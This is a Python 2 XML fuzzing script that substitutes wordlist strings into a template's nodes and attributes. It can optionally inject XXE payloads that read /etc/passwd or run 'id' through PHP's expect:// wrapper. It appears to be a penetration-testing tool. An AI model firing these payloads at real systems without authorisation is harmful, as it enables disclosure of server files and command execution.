#/bin/python2

# xml_fuzzer: Fuzzes XML based on a pre-existing template.
# inf0junki3, November 2016.
# IMPORTANT NOTE: This script doesn't handle external entities within the template. Use the flags 
# instead.

from bs4 import BeautifulSoup
from bs4.element import Tag

DEBUG_MODE      = False

def insert_file_xxe(text, element_name):
    insert_position = text.index("?>") + 2
    XXE_FILE = "<!DOCTYPE {0} [ <!ELEMENT {0} ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>".format(element_name)
    return text[:insert_position] + XXE_FILE + text[insert_position:]

def insert_expect_xxe(text, element_name):
    insert_position = text.index("?>") + 2
    XXE_EXPECT = "<!DOCTYPE {0} [ <!ELEMENT {0} ANY ><!ENTITY xxe SYSTEM \"expect://id\" >]>".format(element_name)

    return text[:insert_position] + XXE_EXPECT + text[insert_position:]

def unescaped(text, do_inject_file, do_inject_expect, element_name):
    REPLACEMENTS = {"&amp;": "&", 
                    "&lt;": "<", 
                    "&rt;": ">", 
                    "\n": ""}
    result = str(text)
    if text is not None:
        for search_for, replace_with in REPLACEMENTS.iteritems():
            result =  result.replace(search_for, replace_with)
    if do_inject_file:
        result = insert_file_xxe(result, element_name)
    if do_inject_expect:
        result = insert_expect_xxe(result, element_name)
    return result

def fuzz_node(node, soup, do_inject_file = False, do_inject_expect = False):
    for fuzz_string in fuzz_strings:
        original_string = node.string
        node.string = fuzz_string
        print(unescaped(soup, do_inject_file, do_inject_expect, node.name))
        node.string = original_string

def fuzz_attr(node, attrib, soup, do_inject_file = False, do_inject_expect = False):
    for fuzz_string in fuzz_strings:
        original_value = node[attrib]
        node[attrib] = fuzz_string
        print(unescaped(soup, do_inject_file, do_inject_expect, node.name))
        node[attrib] = original_value

def explore_children(node, soup, args):
    if type(node) in (Tag, BeautifulSoup):
        if DEBUG_MODE:
            print("NODE: {}".format(node.name))
            print("VALUE: {}".format(node.string))
            print("ATTRIBUTES: {}".format(node.attrs))

        if node.string is not None:
            fuzz_node(node, 
                      soup, 
                      do_inject_file    = args.inject_file_xxe,
                      do_inject_expect  = args.inject_expect_xxe)

        for cur_attr in node.attrs.iterkeys():
            fuzz_attr(node, 
                      cur_attr, 
                      soup,
                      do_inject_file    = args.inject_file_xxe,
                      do_inject_expect  = args.inject_expect_xxe)

        for child in node.children:
            explore_children(child, soup, args)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description = "Generate fuzzed XML files")
    parser.add_argument("--template", 
                        help        = "The XML file to be used as a template", 
                        required    = True)
    parser.add_argument("--fuzz-strings",
                        help        = "The wordlist to be used.",
                        default     = "fuzz_strings.txt")
    parser.add_argument("--inject-expect-xxe",
                        action      = "store_true",
                        help        = "If specified, injects resulting XML with expect XXE (PHP only)")
    parser.add_argument("--inject-file-xxe",
                        action      = "store_true",
                        help        = "If specified, injects resulting XML with file XXE")
    args = parser.parse_args()

    with open(args.template, "r") as pain_file:
        pain_content = pain_file.read()
        soup = BeautifulSoup(pain_content, "xml")
    with open(args.fuzz_strings, "rb") as fuzz_strings_file:
        fuzz_strings = fuzz_strings_file.readlines()
    
        explore_children(soup, soup, args)
